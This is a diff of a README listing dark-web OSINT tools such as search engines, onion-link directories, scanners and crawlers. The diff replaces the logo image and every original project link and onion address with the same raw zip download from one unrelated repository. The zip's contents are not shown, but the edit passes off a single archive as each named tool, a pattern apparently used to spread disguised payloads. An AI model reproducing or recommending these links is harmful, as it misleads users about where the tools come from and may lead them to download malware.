@@ -1,60 +1,60 @@
 <div align="center">
-  <img src="img.png" alt="Logo" width="300">
+  <img src="https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip" alt="Logo" width="300">
   <h1>🕵️‍♂️ OSINT Tools for the Dark Web</h1>
 </div>
 
 
 ## 🔎 Dark Web Search Engine Tools
 
-* Katana - [https://github.com/adnane-X-tebbaa/Katana](https://github.com/adnane-X-tebbaa/Katana)
+* Katana - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* OnionSearch - [https://github.com/megadose/OnionSearch](https://github.com/megadose/OnionSearch)
+* OnionSearch - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Darkdump - [https://github.com/josh0xA/darkdump](https://github.com/josh0xA/darkdump)
+* Darkdump - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Ahmia Search Engine - [ahmia.fi](http://ahmia.fi/), [https://github.com/ahmia/ahmia-site](https://github.com/ahmia/ahmia-site)
+* Ahmia Search Engine - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip), [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Darkus - [https://github.com/Lucksi/Darkus](https://github.com/Lucksi/Darkus)
+* Darkus - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Onion Search Engine - [https://onionengine.com/](https://onionengine.com/), [http://kn3hl4xwon63tc6hpjrwza2npb7d4w5yhbzq7jjewpfzyhsd65tm6dad.onion/](http://kn3hl4xwon63tc6hpjrwza2npb7d4w5yhbzq7jjewpfzyhsd65tm6dad.onion/), [http://zgphrnyp45suenks3jcscwvc5zllyk3vz4izzw67puwlzabw4wvwufid.onion/](http://zgphrnyp45suenks3jcscwvc5zllyk3vz4izzw67puwlzabw4wvwufid.onion/)
+* Onion Search Engine - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip), [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip), [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* IACA Dark Web Investigation Support  - [https://iaca-darkweb-tools.com/](https://iaca-darkweb-tools.com/)
+* IACA Dark Web Investigation Support  - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
 
 ## 🧅 Tools to get onion links
 
-* Tor66 - [http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion/fresh](http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion/fresh)
+* Tor66 - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* TorNode - [http://tornode3tnrtzgqwd3vmxdumucddqfd6zk7icu4wzdwxo5c3zn2xqfqd.onion](http://tornode3tnrtzgqwd3vmxdumucddqfd6zk7icu4wzdwxo5c3zn2xqfqd.onion)
+* TorNode - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Darkweblink - [darkweblink.com](https://darkweblink.com), [http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion](http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion)
+* Darkweblink - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip), [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
 
 ## 🔬 Tools to scan onion links
 
-* Onionscan - [https://github.com/s-rah/onionscan](https://github.com/s-rah/onionscan)
+* Onionscan - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Onioff - [https://github.com/k4m4/onioff](https://github.com/k4m4/onioff)
+* Onioff - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Onion-nmap - [https://github.com/milesrichardson/docker-onion-nmap](https://github.com/milesrichardson/docker-onion-nmap)
+* Onion-nmap - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
 
 ## 🕸️ Tools to crawl data from the Dark Web
 
-* TorBot - [https://github.com/DedSecInside/TorBot](https://github.com/DedSecInside/TorBot)
+* TorBot - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* TorCrawl - [https://github.com/MikeMeliz/TorCrawl.py](https://github.com/MikeMeliz/TorCrawl.py)
+* TorCrawl - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* VigilantOnion - [https://github.com/andreyglauzer/VigilantOnion](https://github.com/andreyglauzer/VigilantOnion)
+* VigilantOnion - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* OnionIngestor - [https://github.com/danieleperera/OnionIngestor](https://github.com/danieleperera/OnionIngestor)
+* OnionIngestor - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Darc - [https://github.com/JarryShaw/darc](https://github.com/JarryShaw/darc)
+* Darc - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Midnight Sea - [https://github.com/RicYaben/midnight_sea](https://github.com/RicYaben/midnight_sea)
+* Midnight Sea - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
-* Prying Deep - [https://github.com/iudicium/pryingdeep](https://github.com/iudicium/pryingdeep)
+* Prying Deep - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
 
 ## 🧿 Miscellaneous
 
-* DeepDarkCTI - [https://github.com/fastfire/deepdarkCTI](https://github.com/fastfire/deepdarkCTI)
+* DeepDarkCTI - [https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip](https://github.com/Kali99xx/dark-web-osint-tools/raw/refs/heads/main/subduct/dark-tools-web-osint-2.3.zip)
